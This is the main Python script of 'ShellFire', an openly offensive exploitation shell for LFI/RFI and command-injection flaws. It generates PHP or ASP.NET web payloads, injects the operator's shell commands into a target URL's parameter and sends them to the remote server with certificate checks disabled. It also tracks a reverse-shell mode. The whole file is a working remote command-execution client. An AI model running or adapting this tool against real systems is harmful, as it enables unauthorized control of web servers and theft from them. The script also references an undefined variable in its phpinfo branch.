#!/bin/env python3
# Thanks to Offensive-Security for inspiring this!
# Written by unix-ninja
# Aug 2016

import argparse
import json
import os
import readline
import requests
import select
import socket
import sys
import threading
import time

from config import cfg, state
from commands import command_list
from payloads import get_aspnet_payload, get_php_payload
from plugin_collection import PluginCollection

############################################################
## Version Check

if (sys.version_info < (3, 0)):
  sys.stderr.write("[!] Error! Must execute this script with Python3.");
  sys.exit(2)

############################################################
## Ephemeral states

plugins = PluginCollection('plugins')

############################################################
## Payloads

def payload_aspnet():
  cfg.payload = get_aspnet_payload(cfg.marker)
  cfg.payload_type = "ASP.NET"

def payload_php():
  cfg.payload = get_php_payload(cfg.marker)
  cfg.payload_type = "PHP"

############################################################
## Parse options

parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and command injection')
parser.add_argument('-c', dest='config', action='store', nargs='?', default=None, const='default', help='load a named config on startup.')
parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
parser.add_argument('--generate', dest='payload', help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
args = parser.parse_args()

############################################################
## Main App

def main():
  ## if we are generating a payload to stdout, do it now, then bail
  if args.payload:
    args.payload = args.payload.lower()
    if args.payload == "php":
      sys.stderr.write("[*] Generating PHP payload...\n")
      payload_php()
    elif args.payload == "aspnet":
      sys.stderr.write("[*] Generating ASP.NET payload...\n")
      payload_aspnet()
    else:
      sys.stderr.write("[*] Invalid payload!\n")
    sys.stdout.write(cfg.payload)
    sys.exit(1)

  ## show our banner
  sys.stdout.write(""" (                                            
)\ )    )       (   (   (                    
(()/( ( /(    (  )\  )\  )\ )  (   (      (   
/(_)))\())  ))\((_)((_)(()/(  )\  )(    ))\  
(_)) ((_)\  /((_)_   _   /(_))((_)(()\  /((_) 
/ __|| |(_)(_)) | | | | (_) _| (_) ((_)(_))   
\__ \| ' \ / -_)| | | |  |  _| | || '_|/ -_)  
|___/|_||_|\___||_| |_|  |_|   |_||_|  \___|
""")
  sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
  sys.stdout.write("[*] Type '.help' to see available commands\n")
  if args.debug == True:
    sys.stdout.write("[*] Debug mode enabled.\n")

  requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

  ## if we specified to load a named config, do it now
  if args.config:
    cmd_config([".config", "load", args.config])

  ## setup history
  if os.path.isfile(cfg.history_file):
    try:
      readline.read_history_file(cfg.history_file)
    except:
      pass

  ## set initial payload for PHP
  payload_php()

  ## main loop
  while True:
    while state.revshell_running:
      try:
        time.sleep(0.1)
      except:
        state.revshell_running = False
    ## reset command execution state each loop
    state.exec_cmd = True
    ## prompt for input
    try:
      state.userinput = input('>> ').strip()
    except EOFError:
      ## if we recieve EOF, gracefully exit
      sys.stdout.write("\n")
      sys.exit(2)
    if not state.userinput:
      continue
    ## parse our input
    cmd = state.userinput.split()

    if cmd[0][0] == '.':
      if cmd[0][1:] in command_list.keys():
        state.exec_cmd = False
        try:
          command_list[cmd[0][1:]]['func'](cmd)
        except Exception as e:
          sys.stdout.write("[!] %s\n" % (repr(e)))

    ## execute our command to the remote target
    if state.exec_cmd:
      cmd = state.userinput

      ## let's run our input through our encoding plugins
      if len(cfg.encode_chain):
        try:
          for enc in cfg.encode_chain:
            cmd = plugins.plugins[enc].run(cmd)
        except:
          pass

      ## validate the URL format
      if '{}' in cfg.url:
        query = cfg.url.replace('{}', cmd.strip())
      else:
        if '?' in cfg.url:
          if 'cmd=' not in cfg.url:
            query = cfg.url + '&cmd=' + cmd
          else:
            query = cfg.url.replace('cmd=', 'cmd=' + cmd)
        else:
          query = cfg.url + cmd.strip()
      ## log debug info
      if args.debug:
        sys.stdout.write("[D] " + query + "\n")
      try:
        if cfg.method == "post":
          r = requests.post(query, data=cfg.post_data, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
        else:
          r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
        ## sanitize the output. we only want to see our commands if possible
        output = r.text.split(cfg.marker)
        if len(output) > 1:
          output = output[1]
        else:
          output = output[0]
        ## display our results
        sys.stdout.write(output + "\n")
        if userinput == '_show_phpinfo':
          file = 'phpinfo.html'
          fp = open(file, 'w')
          fp.write(output)
          fp.close()
          sys.stdout.write("[*] Output saved to " + file + "\n")
      except Exception as e:
        sys.stderr.write("[!] Unable to make request to target\n")
        sys.stderr.write("[!] %s\n" % e)
        sys.stdout.flush()

## Main entrypoint - let's not pollute the global scope here.
if __name__ == "__main__":
  main()
